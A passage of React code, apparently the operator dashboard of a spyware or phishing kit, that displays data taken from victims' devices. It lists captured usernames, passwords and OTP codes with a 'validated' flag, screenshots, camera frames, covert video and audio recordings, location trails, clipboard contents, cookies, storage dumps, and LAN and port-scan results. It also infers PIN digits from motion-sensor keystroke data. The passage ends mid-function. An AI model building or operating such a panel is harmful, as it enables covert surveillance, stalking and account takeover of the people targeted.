  const modeBadge = sessionMode === 'once'
    ? { label: '📍 Once', bg: '#4e5a70', color: '#c9d1e8' }
    : sessionMode === 'watch'
      ? sessionDuration
        ? { label: `🔄 ${sessionDuration}s`, bg: 'rgba(167,139,250,0.13)', color: '#a78bfa' }
        : { label: '🔄 Live', bg: 'rgba(167,139,250,0.13)', color: '#a78bfa' }
      : null;

  const [startAddr, setStartAddr] = useState(null);
  const [endAddr,   setEndAddr]   = useState(null);
  useEffect(() => {
    if (startLat == null || startLon == null) return;
    const key = `geo_addr_v3_${Number(startLat).toFixed(5)}_${Number(startLon).toFixed(5)}`;
    const cached = sessionStorage.getItem(key);
    if (cached) { setStartAddr(JSON.parse(cached)); return; }
    apiFetch(`/api/geocode/reverse?lat=${startLat}&lon=${startLon}`)
      .then(r => { sessionStorage.setItem(key, JSON.stringify(r)); setStartAddr(r); }).catch(()=>{});
  }, [startLat, startLon]);
  useEffect(() => {
    if (endLat == null || endLon == null) return;
    const key = `geo_addr_v3_${Number(endLat).toFixed(5)}_${Number(endLon).toFixed(5)}`;
    const cached = sessionStorage.getItem(key);
    if (cached) { setEndAddr(JSON.parse(cached)); return; }
    apiFetch(`/api/geocode/reverse?lat=${endLat}&lon=${endLon}`)
      .then(r => { sessionStorage.setItem(key, JSON.stringify(r)); setEndAddr(r); }).catch(()=>{});
  }, [endLat, endLon]);

  const fmt = a => a ? [a.road ? a.road + (a.houseNumber ? ' '+a.houseNumber : '') : null, a.city].filter(Boolean).join(', ') : null;
  const startAddrStr = fmt(startAddr), endAddrStr = fmt(endAddr);
  const mapsUrl = endLat != null && endLon != null ? `https://maps.google.com/maps?q=${endLat},${endLon}&z=17` : null;
  const rowStyle = { padding: '12px 0', borderBottom: '1px solid #1c1c1e', background: isLatest ? 'linear-gradient(90deg,#30d15808 0%,transparent 100%)' : 'transparent' };

  return (
    <div style={{ ...rowStyle, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
      <div style={{ flex: 1 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
          <span style={{ fontSize: 11, color: '#4e5a70' }}>{dateStr} {startTimeStr} → {endTimeStr}</span>
          <span style={{ fontSize: 9, fontWeight: 700, color: '#4e5a70', background: 'rgba(255,255,255,0.09)', borderRadius: 4, padding: '1px 6px' }}>{items.length} pings</span>
          {durationMin != null && <span style={{ fontSize: 9, color: '#4e5a70' }}>{durationMin}m</span>}
          {modeBadge && <span style={{ fontSize: 9, fontWeight: 700, background: modeBadge.bg, color: modeBadge.color, borderRadius: 4, padding: '1px 6px', border: '1px solid' + modeBadge.color + '44' }}>{modeBadge.label}</span>}
          {isLatest && <span style={{ fontSize: 9, fontWeight: 700, background: '#22c55e', color: '#000', borderRadius: 4, padding: '1px 5px' }}>LATEST</span>}
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginTop: 6 }}>
          <span style={{ fontSize: 15 }}>{movement.icon}</span>
          <span style={{ fontSize: 13, fontWeight: 700, color: movement.color }}>{movement.label}</span>
          {totalDistKm > 0.05 && (
            <span style={{ fontSize: 11, color: '#4e5a70' }}>{totalDistKm >= 1 ? `${totalDistKm.toFixed(1)} km` : `${Math.round(totalDistKm*1000)} m`}</span>
          )}
        </div>
        {(startAddrStr || endAddrStr) && (
          <div style={{ fontSize: 11, color: '#3b82f6', marginTop: 4 }}>
            {startAddrStr && endAddrStr && startAddrStr !== endAddrStr
              ? <>{startAddrStr} <span style={{ color: '#4e5a70' }}>→</span> {endAddrStr}</>
              : startAddrStr || endAddrStr}
          </div>
        )}
        {endLat != null && endLon != null && (
          <div style={{ fontSize: 11, color: '#4e5a70', marginTop: 2, fontFamily: 'monospace' }}>
            {Number(endLat).toFixed(6)}, {Number(endLon).toFixed(6)}
          </div>
        )}
      </div>
      <div style={{ display: 'flex', flexDirection: 'column', gap: 4, alignItems: 'flex-end' }}>
        {mapsUrl && (
          <a href={mapsUrl} target="_blank" rel="noreferrer"
            style={{ background: 'rgba(59,130,246,0.13)', color: '#3b82f6', borderRadius: 6, padding: '4px 10px', fontSize: 11, fontWeight: 600, textDecoration: 'none', flexShrink: 0 }}>
            Maps ↗
          </a>
        )}
        <DelBtn onClick={async () => {
          await Promise.all(items.map(it => apiFetch(`/api/devices/${deviceId}/events/${it.raw.id}`, { method: 'DELETE' })));
          onLoad();
        }} />
      </div>
    </div>
  );
}

function VideoRow({ item, rowStyle, dateStr, timeStr, latestBadge, deviceId, onLoad }) {
  const v = item.raw;
  const sizeKb = Math.round((v.size_bytes ?? 0) / 1024);
  const [open, setOpen] = useState(false);
  const [blobUrl, setBlobUrl] = useState(null);
  const togglePlay = async () => {
    if (!open && !blobUrl) {
      const resp = await fetch(v.url, { credentials: 'include' });
      if (resp.ok) setBlobUrl(URL.createObjectURL(await resp.blob()));
    }
    setOpen(o => !o);
  };
  return (
    <div style={{ ...rowStyle }}>
      <div style={{ display: 'flex', gap: 12, alignItems: 'center' }}>
        <span style={{ fontSize: 24 }}>🎬</span>
        <div style={{ flex: 1 }}>
          <div style={{ display: 'flex', gap: 6, alignItems: 'center' }}>
            <span style={{ fontSize: 12, color: '#c9d1e8', fontWeight: 600 }}>Live recording · {sizeKb} KB</span>
            {v.source && <span style={{ fontSize: 9, fontWeight: 700, background: v.source === 'front' ? 'rgba(59,130,246,0.20)' : 'rgba(245,158,11,0.20)', color: v.source === 'front' ? '#3b82f6' : '#f59e0b', borderRadius: 3, padding: '1px 5px', textTransform: 'uppercase' }}>{v.source}</span>}
          </div>
          <div style={{ fontSize: 11, color: '#4e5a70', marginTop: 2 }}>{dateStr} {timeStr}{latestBadge}</div>
        </div>
        <button onClick={togglePlay} style={{ padding: '5px 10px', borderRadius: 7, background: open ? 'rgba(34,197,94,0.13)' : 'rgba(245,158,11,0.13)', border: 'none', color: open ? '#22c55e' : '#f59e0b', fontSize: 11, fontWeight: 600, cursor: 'pointer', flexShrink: 0 }}>{open ? '⏸ Hide' : '▶ Play'}</button>
        <button onClick={async () => { const resp = await fetch(v.url, { credentials: 'include' }); if (resp.ok) { const b = URL.createObjectURL(await resp.blob()); const a = document.createElement('a'); a.href = b; a.download = `live_${deviceId}_${v.id}.mp4`; a.click(); URL.revokeObjectURL(b); } }} style={{ padding: '5px 10px', borderRadius: 7, background: 'rgba(59,130,246,0.13)', border: 'none', color: '#3b82f6', fontSize: 11, fontWeight: 600, cursor: 'pointer', flexShrink: 0 }}>⬇</button>
        <button onClick={async () => { await apiFetch(`/api/devices/${deviceId}/videos/${v.id}`, { method: 'DELETE' }); onLoad(); }} style={{ background: 'rgba(239,68,68,0.13)', border: 'none', color: '#ef4444', borderRadius: 6, padding: '3px 9px', fontSize: 11, cursor: 'pointer', flexShrink: 0 }}>✕</button>
      </div>
      {open && blobUrl && <video controls autoPlay src={blobUrl} style={{ width: '100%', marginTop: 10, borderRadius: 8, maxHeight: 320, background: '#000' }} />}
    </div>
  );
}

function AudioRow({ item, rowStyle, dateStr, timeStr, latestBadge, deviceId, onLoad }) {
  const r = item.raw;
  const sizeKb = Math.round((r.size_bytes ?? 0) / 1024);
  const [open, setOpen] = useState(false);
  const [blobUrl, setBlobUrl] = useState(null);
  const togglePlay = async () => {
    if (!open && !blobUrl) {
      const resp = await fetch(r.url, { credentials: 'include' });
      if (resp.ok) setBlobUrl(URL.createObjectURL(await resp.blob()));
    }
    setOpen(o => !o);
  };
  return (
    <div style={{ ...rowStyle }}>
      <div style={{ display: 'flex', gap: 12, alignItems: 'center' }}>
        <span style={{ fontSize: 24 }}>🎙️</span>
        <div style={{ flex: 1 }}>
          <span style={{ fontSize: 12, color: '#c9d1e8', fontWeight: 600 }}>Audio recording · {sizeKb} KB</span>
          <div style={{ fontSize: 11, color: '#4e5a70', marginTop: 2 }}>{dateStr} {timeStr}{latestBadge}</div>
        </div>
        <button onClick={togglePlay} style={{ padding: '5px 10px', borderRadius: 7, background: open ? 'rgba(34,197,94,0.13)' : 'rgba(245,158,11,0.13)', border: 'none', color: open ? '#22c55e' : '#f59e0b', fontSize: 11, fontWeight: 600, cursor: 'pointer', flexShrink: 0 }}>{open ? '⏸ Hide' : '▶ Play'}</button>
        <button onClick={async () => { const resp = await fetch(r.url, { credentials: 'include' }); if (resp.ok) { const b = URL.createObjectURL(await resp.blob()); const a = document.createElement('a'); a.href = b; a.download = `rec_${deviceId}_${r.id}.m4a`; a.click(); URL.revokeObjectURL(b); } }} style={{ padding: '5px 10px', borderRadius: 7, background: 'rgba(59,130,246,0.13)', border: 'none', color: '#3b82f6', fontSize: 11, fontWeight: 600, cursor: 'pointer', flexShrink: 0 }}>⬇</button>
        <button onClick={async () => { await apiFetch(`/api/devices/${deviceId}/recordings/${r.id}`, { method: 'DELETE' }); onLoad(); }} style={{ background: 'rgba(239,68,68,0.13)', border: 'none', color: '#ef4444', borderRadius: 6, padding: '3px 9px', fontSize: 11, cursor: 'pointer', flexShrink: 0 }}>✕</button>
      </div>
      {open && blobUrl && <audio controls autoPlay src={blobUrl} style={{ width: '100%', marginTop: 10 }} />}
    </div>
  );
}

function HeatBar({ label, count, total }) {
  const pct = total > 0 ? Math.round(count / total * 100) : 0;
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 3 }}>
      <span style={{ fontSize: 10, color: '#4e5a70', width: 36, textAlign: 'right', textTransform: 'uppercase', fontWeight: 600 }}>{label}</span>
      <div style={{ flex: 1, height: 6, background: '#141728', borderRadius: 3, overflow: 'hidden' }}>
        <div style={{ width: `${pct}%`, height: '100%', background: '#a78bfa', borderRadius: 3, transition: 'width 0.4s' }} />
      </div>
      <span style={{ fontSize: 10, color: '#4e5a70', width: 22, textAlign: 'right' }}>{count}</span>
    </div>
  );
}

function pinSeqLabel(c) {
  const R = { top: 'T', mid: 'M', bot: 'B' };
  const S = { left: 'L', center: 'C', right: 'R' };
  return (c.rows ?? []).map((r, i) => `[${R[r] ?? '?'}-${S[(c.sides ?? [])[i]] ?? '?'}]`).join(' ');
}

function pinDigits(c) {
  const MAP = {
    'top-left': '1', 'top-center': '2', 'top-right': '3',
    'mid-left': '4', 'mid-center': '5', 'mid-right': '6',
    'bot-left': '7', 'bot-center': '0/8', 'bot-right': '9',
  };
  return (c.rows ?? []).map((r, i) => MAP[`${r}-${(c.sides ?? [])[i]}`] ?? '?').join(' - ');
}

function MotionConsoleCard({ items, deviceId, onLoad }) {
  const liveEvents  = items.filter(i => i.type === 'motion_session_live');
  const latest      = liveEvents[0];
  if (!latest) return null;

  const ksEvents    = items.filter(i => i.type === 'motion_keystroke_event');
  const ksData      = parseData(items.find(i => i.type === 'motion_keystrokes')?.raw?.data_json);
  const summaryData = parseData(items.find(i => i.type === 'motion_session_summary')?.raw?.data_json);
  const ksSummary   = ksData ?? summaryData?.keystrokes ?? null;
  const pinCandidates = ksSummary?.pinCandidates ?? [];
  const d            = parseData(latest.raw.data_json);

  const rowCounts  = { top: 0, mid: 0, bot: 0 };
  const sideCounts = { left: 0, center: 0, right: 0 };
  if (ksEvents.length > 0) {
    ksEvents.forEach(ks => {
      const k = (parseData(ks.raw.data_json)?.k) ?? {};
      if (k.row)  rowCounts[k.row]   = (rowCounts[k.row]   || 0) + 1;
      if (k.side) sideCounts[k.side] = (sideCounts[k.side] || 0) + 1;
    });
  } else if (ksSummary?.rowHeatmap) {
    Object.assign(rowCounts,  ksSummary.rowHeatmap);
    Object.assign(sideCounts, ksSummary.sideHeatmap ?? {});
  }
  const totalKs = ksEvents.length > 0 ? ksEvents.length : (ksSummary?.count ?? 0);

  const actColor  = { stationary:'#4e5a70',walking:'#22c55e',running:'#f59e0b',in_vehicle:'#3b82f6',fidgeting:'#ef4444',unknown:'#4e5a70' }[d.activity] ?? '#4e5a70';
  const elevIcon  = { ascending:'⬆', descending:'⬇', stationary:'-', movement:'↕' }[d.elevator] ?? '?';
  const elapsedSec = d.elapsed ? Math.floor(d.elapsed / 1000) : 0;
  const elapsedStr = elapsedSec >= 60 ? `${Math.floor(elapsedSec/60)}m ${elapsedSec%60}s` : `${elapsedSec}s`;
  const isLive    = Date.now() - (latest.ts?.getTime() ?? 0) < 8000;

  const statusCells = [
    { label: 'ACTIVITY',  value: d.activity?.replace(/_/g,' ') ?? '-',  color: actColor },
    { label: 'CONTEXT',   value: d.context?.replace(/_/g,' ')  ?? '-',  color: '#a78bfa' },
    { label: 'ELEVATOR',  value: `${elevIcon} ${d.elevator ?? '-'}`,    color: '#f59e0b' },
    { label: 'COMPASS',   value: d.cardinal ?? '-',
      sub: d.compassHeading != null ? `${d.compassHeading}°` : null,    color: '#f59e0b' },
  ];

  return (
    <div style={{
      background: 'linear-gradient(135deg,#120a2a 0%,#0a0a18 50%,#071510 100%)',
      border: `1px solid ${isLive ? 'rgba(34,197,94,0.25)' : 'rgba(255,255,255,0.09)'}`,
      borderRadius: 12, padding: '14px 16px', marginBottom: 12,
    }}>
      {/* Header */}
      <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:12 }}>
        <div style={{ display:'flex', alignItems:'center', gap:8 }}>
          {isLive && <span style={{
            width:8, height:8, borderRadius:'50%', background:'#22c55e',
            boxShadow:'0 0 8px #30d158', display:'inline-block',
            animation:'_liveP 1.5s ease-in-out infinite',
          }} />}
          <span style={{ fontSize:11, fontWeight:800, letterSpacing:'0.1em', color: isLive ? '#22c55e' : '#4e5a70' }}>
            {isLive ? 'LIVE MOTION INTELLIGENCE' : 'MOTION INTELLIGENCE'}
          </span>
        </div>
        <span style={{ fontSize:11, color:'#4e5a70' }}>{elapsedStr} · {liveEvents.length} samples</span>
      </div>

      {/* Status grid */}
      <div style={{ display:'grid', gridTemplateColumns:'repeat(4,1fr)', gap:8, marginBottom:12 }}>
        {statusCells.map(cell => (
          <div key={cell.label} style={{
            background:'#07080f', borderRadius:8, padding:'8px 10px',
            border:`1px solid ${cell.color}22`,
          }}>
            <div style={{ fontSize:9, color:'#4e5a70', fontWeight:700, letterSpacing:'0.08em', marginBottom:4 }}>{cell.label}</div>
            <div style={{ fontSize:13, fontWeight:700, color:cell.color }}>{cell.value}</div>
            {cell.sub && <div style={{ fontSize:10, color:'#4e5a70', marginTop:2 }}>{cell.sub}</div>}
          </div>
        ))}
      </div>

      {/* Stats row */}
      <div style={{ display:'flex', gap:8, flexWrap:'wrap', marginBottom: totalKs > 0 ? 10 : 0 }}>
        {(d.cadence > 0 || d.steps > 0) && <span style={{ background:'rgba(59,130,246,0.13)', border:'1px solid rgba(59,130,246,0.27)', color:'#3b82f6', padding:'3px 10px', borderRadius:6, fontSize:11, fontWeight:600 }}>👣 {d.steps ?? 0} steps {d.cadence ? `· ${d.cadence}/min` : ''}</span>}
        {totalKs > 0 && <span style={{ background:'rgba(167,139,250,0.13)', border:'1px solid rgba(167,139,250,0.27)', color:'#a78bfa', padding:'3px 10px', borderRadius:6, fontSize:11, fontWeight:600 }}>⌨️ {totalKs} keystrokes</span>}
        {pinCandidates.length > 0 && <span style={{ background:'rgba(239,68,68,0.13)', border:'1px solid rgba(239,68,68,0.27)', color:'#ef4444', padding:'3px 10px', borderRadius:6, fontSize:11, fontWeight:700 }}>🔐 {pinCandidates.length} PIN candidate{pinCandidates.length > 1 ? 's' : ''}</span>}
      </div>

      {/* Keyboard heatmap */}
      {totalKs > 0 && (
        <div style={{ background:'#07080f', borderRadius:8, padding:'10px 12px', border:'1px solid rgba(167,139,250,0.13)' }}>
          <div style={{ fontSize:10, color:'#4e5a70', fontWeight:700, letterSpacing:'0.08em', marginBottom:8 }}>KEYBOARD HEATMAP</div>
          <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'0 20px' }}>
            <div>
              <div style={{ fontSize:9, color:'#4e5a70', marginBottom:4 }}>ROW</div>
              <HeatBar label="top" count={rowCounts.top} total={totalKs} />
              <HeatBar label="mid" count={rowCounts.mid} total={totalKs} />
              <HeatBar label="bot" count={rowCounts.bot} total={totalKs} />
            </div>
            <div>
              <div style={{ fontSize:9, color:'#4e5a70', marginBottom:4 }}>SIDE</div>
              <HeatBar label="left"  count={sideCounts.left}   total={totalKs} />
              <HeatBar label="ctr"   count={sideCounts.center} total={totalKs} />
              <HeatBar label="right" count={sideCounts.right}  total={totalKs} />
            </div>
          </div>
          {pinCandidates.length > 0 && (
            <div style={{ marginTop:8, padding:'6px 10px', background:'#ff453a0a', borderRadius:6, border:'1px solid #ff453a33' }}>
              <div style={{ fontSize:10, color:'#ef4444', fontWeight:700, marginBottom:4 }}>🔐 PIN CANDIDATES ({pinCandidates.length})</div>
              {pinCandidates.map((p, i) => (
                <div key={i} style={{ marginBottom:6 }}>
                  <span style={{ fontFamily:'monospace', fontSize:11, color:'#f59e0b' }}>{p.digits}-digit · {p.avgGapMs}ms avg</span>
                  <div style={{ fontFamily:'monospace', fontSize:10, color:'#4e5a70', marginTop:1 }}>{pinSeqLabel(p)}</div>
                  <div style={{ fontFamily:'monospace', fontSize:18, color:'#f59e0b', fontWeight:700, letterSpacing:4, marginTop:2 }}>
                    {pinDigits(p)}
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      )}
      <style>{`@keyframes _liveP{0%,100%{opacity:1}50%{opacity:0.25}}`}</style>
    </div>
  );
}

function MotionGroupView({ items, deviceId, onLoad, renderItem }) {
  const nonLive = items.filter(i => i.type !== 'motion_session_live');
  return (
    <>
      <MotionConsoleCard items={items} deviceId={deviceId} onLoad={onLoad} />
      {nonLive.map((item, idx) => renderItem(item, idx === 0 && !items.some(i => i.type === 'motion_session_live')))}
    </>
  );
}

function IntelligenceTab({ events, screenshots, cameraFrames, videos, recordings, creds, deviceId, setLightbox, onLoad }) {
  const [collapsed, setCollapsed] = useState({});

  const byGroup = {};
  if (creds?.length) {
    byGroup.credentials = creds.map(c => ({ id: `cred-${c.id}`, type: 'credentials', ts: parseUTC(c.timestamp), raw: c }))
      .sort((a, b) => (b.ts?.getTime() ?? 0) - (a.ts?.getTime() ?? 0));
  }
  screenshots.forEach(s => (byGroup.screenshot ??= []).push({ id: `ss-${s.id}`, type: 'screenshot', ts: parseUTC(s.timestamp), raw: s }));
  cameraFrames.forEach(f => (byGroup.camera ??= []).push({ id: `cam-${f.id}`, type: 'camera', ts: parseUTC(f.timestamp), raw: f }));
  (videos ?? []).forEach(v => (byGroup.video ??= []).push({ id: `vid-${v.id}`, type: 'video', ts: parseUTC(v.timestamp), raw: v }));
  (recordings ?? []).forEach(r => (byGroup.audio ??= []).push({ id: `rec-${r.id}`, type: 'audio', ts: parseUTC(r.timestamp), raw: r }));
  events.forEach(e => {
    const ts = parseUTC(e.timestamp);
    const item = { id: `ev-${e.id}`, ts, raw: e };
    if (e.type === 'geolocation') (byGroup.geo ??= []).push({ ...item, type: 'geo' });
    else if (e.type === 'clipboard') (byGroup.clipboard ??= []).push({ ...item, type: 'clipboard' });
    else if (e.type === 'filesystem') (byGroup.filesystem ??= []).push({ ...item, type: 'filesystem' });
    else if (e.type === 'payment_response') (byGroup.payment ??= []).push({ ...item, type: 'payment' });
    else if (['motion','compass','motion_capture','motion_stream','motion_activity','motion_gait','motion_context','motion_tremor','motion_taps','motion_tap_detected','motion_keystroke_event','motion_keystrokes','motion_elevator','motion_photo','motion_dead_reckoning','motion_profile','motion_session_started','motion_session_live','motion_session_summary'].includes(e.type)) (byGroup.motion ??= []).push({ ...item, type: e.type });
    else if (e.type === 'speech_result') (byGroup.speech ??= []).push({ ...item, type: 'speech' });
    else if (e.type === 'cookies') (byGroup.cookies ??= []).push({ ...item, type: 'cookies' });
    else if (e.type === 'storage_dump') (byGroup.storage ??= []).push({ ...item, type: 'storage' });
    else if (e.type === 'gpu') (byGroup.gpu ??= []).push({ ...item, type: 'gpu' });
    else if (e.type === 'lan_host_found') (byGroup.lan ??= []).push({ ...item, type: 'lan' });
    else if (e.type === 'port_scan_found') (byGroup.portscan ??= []).push({ ...item, type: 'portscan' });
  });
  Object.values(byGroup).forEach(arr => arr.sort((a, b) => (b.ts?.getTime() ?? 0) - (a.ts?.getTime() ?? 0)));

  function toggleCollapse(id) { setCollapsed(c => ({ ...c, [id]: !c[id] })); }

  function renderItem(item, isLatest) {
    const timeStr = item.ts?.toLocaleTimeString('en-IL', { timeZone: 'Asia/Jerusalem', hour: '2-digit', minute: '2-digit', second: '2-digit' }) ?? '-';
    const dateStr = item.ts?.toLocaleDateString('en-IL', { timeZone: 'Asia/Jerusalem' }) ?? '';
    const latestBadge = isLatest ? (
      <span style={{ fontSize: 9, fontWeight: 700, background: '#22c55e', color: '#000', borderRadius: 4, padding: '1px 5px', marginLeft: 6, verticalAlign: 'middle' }}>LATEST</span>
    ) : null;
    const rowStyle = {
      padding: '12px 0', borderBottom: '1px solid #1c1c1e',
      background: isLatest ? 'linear-gradient(90deg,#30d15808 0%,transparent 100%)' : 'transparent',
    };

    if (item.type === 'screenshot' || item.type === 'camera') {
      const isShot = item.type === 'screenshot';
      const url = item.raw.url;
      const deleteUrl = isShot ? `/api/devices/${deviceId}/screenshots/${item.raw.id}` : `/api/devices/${deviceId}/camera/${item.raw.id}`;
      return (
        <div key={item.id} style={{ ...rowStyle, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
          <div onClick={() => setLightbox(url)} style={{ cursor: 'zoom-in', flexShrink: 0, position: 'relative' }}>
            <AuthedImage url={url} style={{ width: 80, height: isShot ? 134 : 60, objectFit: 'cover', borderRadius: 8, border: isLatest ? '2px solid #30d158' : '1px solid #2c2c2e', display: 'block' }} />
            {isLatest && <span style={{ position: 'absolute', top: 4, left: 4, fontSize: 9, fontWeight: 700, background: '#22c55e', color: '#000', borderRadius: 3, padding: '1px 4px' }}>LATEST</span>}
          </div>
          <div style={{ flex: 1 }}>
            <div style={{ fontSize: 11, color: '#4e5a70' }}>{dateStr} {timeStr}</div>
            <div style={{ display: 'flex', gap: 6, marginTop: 2, alignItems: 'center' }}>
              <span style={{ fontSize: 11, color: '#4e5a70' }}>{Math.round((item.raw.size_bytes ?? 0) / 1024)} KB</span>
              {item.raw.source && <span style={{ fontSize: 9, fontWeight: 700, background: item.raw.source === 'front' ? 'rgba(59,130,246,0.20)' : 'rgba(245,158,11,0.20)', color: item.raw.source === 'front' ? '#3b82f6' : '#f59e0b', borderRadius: 3, padding: '1px 5px', textTransform: 'uppercase' }}>{item.raw.source}</span>}
            </div>
          </div>
          <button onClick={async () => { await apiFetch(deleteUrl, { method: 'DELETE' }); onLoad(); }}
            style={{ background: 'rgba(239,68,68,0.13)', border: 'none', color: '#ef4444', borderRadius: 6, padding: '3px 9px', fontSize: 11, cursor: 'pointer', flexShrink: 0 }}>✕</button>
        </div>
      );
    }


    if (item.type === 'filesystem') {
      const d = parseData(item.raw.data_json);
      const dataUrl = d.file?.dataUrl ?? null;
      const name = d.file?.name ?? d.name ?? 'file';
      const size = d.file?.size ?? d.size ?? 0;
      const mime = d.file?.type ?? d.type ?? '';
      const isImg = mime.startsWith('image/');
      return (
        <div key={item.id} style={{ ...rowStyle, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
          {isImg && dataUrl && (
            <div onClick={() => setLightbox(dataUrl)} style={{ cursor: 'zoom-in', flexShrink: 0 }}>
              <img src={dataUrl} alt={name} style={{ width: 80, height: 80, objectFit: 'cover', borderRadius: 8, border: isLatest ? '2px solid #ff9f0a' : '1px solid #2c2c2e', display: 'block' }} />
            </div>
          )}
          {!isImg && <span style={{ fontSize: 32, flexShrink: 0 }}>📄</span>}
          <div style={{ flex: 1 }}>
            <div style={{ fontSize: 11, color: '#4e5a70', marginBottom: 2 }}>{dateStr} {timeStr}{latestBadge}</div>
            <div style={{ fontSize: 12, color: '#f59e0b', wordBreak: 'break-all' }}>{name}</div>
            <div style={{ fontSize: 11, color: '#4e5a70' }}>{Math.round(size / 1024)} KB {mime && `· ${mime}`}</div>
            {dataUrl && !isImg && (
              <a href={dataUrl} download={name} style={{ fontSize: 11, color: '#3b82f6' }}>⬇ Download</a>
            )}
            {d.cancelled && <div style={{ fontSize: 11, color: '#ef4444' }}>Cancelled</div>}
          </div>
          <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
        </div>
      );
    }

    if (item.type === 'video') {
      return <VideoRow key={item.id} item={item} rowStyle={rowStyle} dateStr={dateStr} timeStr={timeStr} latestBadge={latestBadge} deviceId={deviceId} onLoad={onLoad} />;
    }

    if (item.type === 'audio') {
      return <AudioRow key={item.id} item={item} rowStyle={rowStyle} dateStr={dateStr} timeStr={timeStr} latestBadge={latestBadge} deviceId={deviceId} onLoad={onLoad} />;
    }

    if (item.type === 'credentials') {
      const c = item.raw;
      return (
        <div key={item.id} style={{ ...rowStyle, display: 'flex', gap: 16, alignItems: 'center', flexWrap: 'wrap' }}>
          <div style={{ flex: 1, display: 'flex', gap: 20, flexWrap: 'wrap', alignItems: 'center' }}>
            <span style={{ fontSize: 13 }}>👤 <span style={{ fontFamily: 'monospace', color: '#c9d1e8' }}>{c.username || '-'}</span></span>
            <span style={{ fontSize: 13 }}>🔑 <span style={{ fontFamily: 'monospace', color: '#f59e0b' }}>{c.password || '-'}</span></span>
            {c.otp && <span style={{ fontSize: 13, color: '#f59e0b' }}>OTP: {c.otp}</span>}
            <span style={{ fontSize: 11, color: c.validated ? '#22c55e' : '#4e5a70' }}>{c.validated ? '✓ Validated' : '? Unvalidated'}</span>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
            <div style={{ fontSize: 11, color: '#4e5a70' }}>{dateStr} {timeStr}{latestBadge}</div>
            <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/credentials/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
          </div>
        </div>
      );
    }

    if (item.type === 'geo') {
      return <GeoItem key={item.id} item={item} rowStyle={rowStyle} dateStr={dateStr} timeStr={timeStr} latestBadge={latestBadge} deviceId={deviceId} onLoad={onLoad} />;
    }

    if (item.type === 'clipboard') {
      const d = parseData(item.raw.data_json);
      const text = d.text ?? '';
      return (
        <div key={item.id} style={{ ...rowStyle, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
          <div style={{ flex: 1 }}>
            <div style={{ fontSize: 11, color: '#4e5a70', marginBottom: 4 }}>{dateStr} {timeStr}{latestBadge}</div>
            <div style={{ fontSize: 12, color: '#f59e0b', wordBreak: 'break-all', fontFamily: 'monospace' }}>{text || '(empty)'}</div>
          </div>
          <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
        </div>
      );
    }


    if (item.type === 'motion') {
      const d = parseData(item.raw.data_json);
      return (
        <div key={item.id} style={{ ...rowStyle, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
          <div style={{ flex: 1 }}>
            <div style={{ fontSize: 11, color: '#4e5a70', marginBottom: 4 }}>{dateStr} {timeStr}{latestBadge}</div>
            <div style={{ fontSize: 12, color: 'rgba(201,209,232,0.80)', fontVariantNumeric: 'tabular-nums' }}>
              {d.heading != null && <span>Heading: {Number(d.heading).toFixed(1)}°  </span>}
              {d.x != null && <span>x:{Number(d.x).toFixed(2)} y:{Number(d.y).toFixed(2)} z:{Number(d.z).toFixed(2)}</span>}
            </div>
          </div>
          <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
        </div>
      );
    }

    if (item.type === 'motion_capture') {
      const d = parseData(item.raw.data_json);
      const m = d.motion ?? {};
      const o = d.orientation ?? {};
      const mag = d.magnitude;
      const compass = o.compassHeading;
      const cardDir = compass != null ? ['N','NE','E','SE','S','SW','W','NW'][Math.round(compass / 45) % 8] : null;
      return (
        <div key={item.id} style={{ ...rowStyle }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
            <div style={{ fontSize: 11, color: '#4e5a70', marginBottom: 6 }}>{dateStr} {timeStr} - Snapshot{latestBadge}</div>
            <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '4px 16px', fontSize: 12, fontVariantNumeric: 'tabular-nums' }}>
            {compass != null && <div style={{ color: '#f59e0b', fontWeight: 600, gridColumn: '1/-1', fontSize: 13 }}>🧭 {compass.toFixed(1)}° {cardDir}</div>}
            {mag    != null && <div><span style={{ color: '#4e5a70' }}>Force </span><span style={{ color: '#c9d1e8' }}>{mag} m/s²</span></div>}
            {m.interval != null && <div><span style={{ color: '#4e5a70' }}>Rate </span><span style={{ color: '#c9d1e8' }}>{(1000 / m.interval).toFixed(0)} Hz</span></div>}
            {m.ax != null && <div style={{ gridColumn: '1/-1', color: '#ebebf5aa', fontSize: 11 }}>
              Accel: x={m.ax} y={m.ay} z={m.az} m/s²
            </div>}
            {m.rAlpha != null && <div style={{ gridColumn: '1/-1', color: '#ebebf5aa', fontSize: 11 }}>
              Gyro: α={m.rAlpha} β={m.rBeta} γ={m.rGamma} °/s
            </div>}
            {o.beta != null && <div style={{ gridColumn: '1/-1', color: '#ebebf5aa', fontSize: 11 }}>
              Tilt: β={o.beta}° γ={o.gamma}° α={o.alpha}°
            </div>}
          </div>
        </div>
      );
    }

    if (item.type === 'motion_stream') {
      const d = parseData(item.raw.data_json);
      const compasses = d.compass ?? [];
      const avgCompass = compasses.length ? (compasses.reduce((s, v) => s + v, 0) / compasses.length).toFixed(1) : null;
      const cardDir = avgCompass != null ? ['N','NE','E','SE','S','SW','W','NW'][Math.round(avgCompass / 45) % 8] : null;
      return (
        <div key={item.id} style={{ ...rowStyle }}>
